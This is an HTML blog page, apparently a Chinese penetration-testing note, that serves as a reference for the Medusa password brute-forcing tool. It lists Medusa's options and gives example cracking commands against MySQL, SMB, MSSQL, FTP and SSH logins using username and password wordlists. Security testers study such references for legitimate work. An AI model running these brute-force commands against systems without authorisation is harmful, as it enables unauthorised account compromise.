@@ -1,0 +1,316 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Medusa使用 | txjg blog</title>
+  <meta name="author" content="txjg">
+  
+  <meta name="description" content="Medusa查看可使用的模块medusa -d
+
+显示指定模块的帮助信息medusa -M 模块 -q
+
+Medusa常用参数-h	目标主机名或IP地址
+-H	包含目标主机名或IP地址的文件
+-u	用户名
+-U	用户名文件
+-p	密码
+-P	密码文件
+-C	组合条目文件,格式为host:user:p">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Medusa使用"/>
+  <meta property="og:site_name" content="txjg blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="txjg blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">  
+  <link rel="stylesheet" href="/css/sidenav.css" media="screen" type="text/css">  
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body id="body" data-spy="scroll" data-target=".toc">
+  <div class="container" id="container">
+	<div class="content">
+	  <div class="page-header">		
+  <h1><a class="brand" href="/">txjg blog</a><span class="split"></span><span class="title">Medusa使用</span><span class="date" id="title-date"><i class="fa fa-clock-o"></i> 2022-04-23</span></h1>
+</div>		
+
+<div class="row page">
+  <!-- cols -->	
+  
+  <div class="col-xs-12 col-sm-3 col-md-3 toc"> 
+	<!-- toc -->
+<script type="text/javascript">
+		jQuery(document).ready(function() {
+ 		   generateWikiTOC('.note', '.toc',  2 , 2 );
+		});
+</script>
+  </div><!-- col-md-3 -->
+  
+  
+
+  
+  <div class="col-xs-12 col-sm-9 col-md-9 note">
+	
+
+	  <!-- content -->
+	  <h1 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h1><h2 id="查看可使用的模块"><a href="#查看可使用的模块" class="headerlink" title="查看可使用的模块"></a>查看可使用的模块</h2><pre class="line-numbers language-none"><code class="language-none">medusa -d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="显示指定模块的帮助信息"><a href="#显示指定模块的帮助信息" class="headerlink" title="显示指定模块的帮助信息"></a>显示指定模块的帮助信息</h2><pre class="line-numbers language-none"><code class="language-none">medusa -M 模块 -q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="Medusa常用参数"><a href="#Medusa常用参数" class="headerlink" title="Medusa常用参数"></a>Medusa常用参数</h2><pre class="line-numbers language-none"><code class="language-none">-h	目标主机名或IP地址
+-H	包含目标主机名或IP地址的文件
+-u	用户名
+-U	用户名文件
+-p	密码
+-P	密码文件
+-C	组合条目文件,格式为host:user:password
+-O	日志信息文件
+-e	n:空密码探测 s:密码等同用户名探测 ns:空密码和密码等同用户名探测
+-M	要执行的模块名(没有.mod扩展名)
+-m	传递给模块的参数.(可传递多个参数，如:-m para1 -m para2)
+-d	显示所有的模块名称
+-n	使用非默认端口
+-s	启用SSL
+-r	重试间隔时间，默认为3s
+-t	设置线程数量
+-L	并行化，每个用户使用一个线程
+-f	在发现第一个有效的用户名&#x2F;密码后停止破解
+-q	显示模块的使用信息
+-v	详细级别(0-6,默认为5)
+-w	错误调试级别(0-10,默认为5)
+-V	显示版本
+-Z	继续扫描上一次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="medusa破解实例"><a href="#medusa破解实例" class="headerlink" title="medusa破解实例"></a>medusa破解实例</h2><h3 id="mysql破解"><a href="#mysql破解" class="headerlink" title="mysql破解"></a>mysql破解</h3><pre class="line-numbers language-none"><code class="language-none">medusa -h 192.168.1.1 -u root -P pass.txt -M mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="smbnt破解"><a href="#smbnt破解" class="headerlink" title="smbnt破解"></a>smbnt破解</h3><pre class="line-numbers language-none"><code class="language-none">medusa -h 192.168.1.1 -U user.txt -P pass.txt -e ns -M smbnt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="mssql破解"><a href="#mssql破解" class="headerlink" title="mssql破解"></a>mssql破解</h3><pre class="line-numbers language-none"><code class="language-none">medusa -h 192.168.1.1 -u sa -P pass.txt -t 5 -f -M mssql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="ftp破解"><a href="#ftp破解" class="headerlink" title="ftp破解"></a>ftp破解</h3><pre class="line-numbers language-none"><code class="language-none">medusa -C comb.txt -M ftp
+注:comb.txt内容为
+192.168.1.1:user:pass
+192.168.1.2:user:
+192.168.1.1::passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="ssh破解"><a href="#ssh破解" class="headerlink" title="ssh破解"></a>ssh破解</h3><pre class="line-numbers language-none"><code class="language-none">medusa -M ssh -H host.txt -U user.txt -p passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="输出日志信息文件"><a href="#输出日志信息文件" class="headerlink" title="输出日志信息文件"></a>输出日志信息文件</h2><pre class="line-numbers language-none"><code class="language-none">medusa -h 192.168.1.1 -u root -p password -t 5 -f -M mysql -O log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	  
+
+	  <div>
+  		<center>
+		  <div class="pagination">
+<ul class="pagination">
+	
+	
+	
+	
+	
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+			
+			
+		
+	
+		
+			
+			
+			
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+			
+		
+	
+		
+	
+		
+	
+		
+	
+		
+			
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+		
+	
+	
+	
+		<li class="prev disabled"><a><i class="fa fa-arrow-circle-o-left"></i>prev</a></li>
+	
+	<li><a href="/"><i class="fa fa-archive"></i>Home</a></li>
+	
+		<li class="next"><a href="/2022/04/22/Hydra/" class="alignright next">next<i class="fa fa-arrow-circle-o-right"></i></a></li>
+	
+</ul>
+</div>
+
+		</center>
+	  </div>
+	  
+	</div> <!-- col-md-9/col-md-12 -->
+	
+  </div><!-- row -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+	<footer> <p>
+  &copy; 2022 txjg
+  
+      with help from <a href="http://zespia.tw/hexo/" target="_blank">Hexo</a> and <a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a>. Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-wixo/">Wixo</a>.    
+</p> </footer>
+  </div> <!-- container-narrow -->
+  
+<a id="gotop" href="#">   
+  <span>▲</span> 
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/jquery.tableofcontents.min.js"></script>
+<script src="/js/tocgenerator.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+
+</body>
+</html>
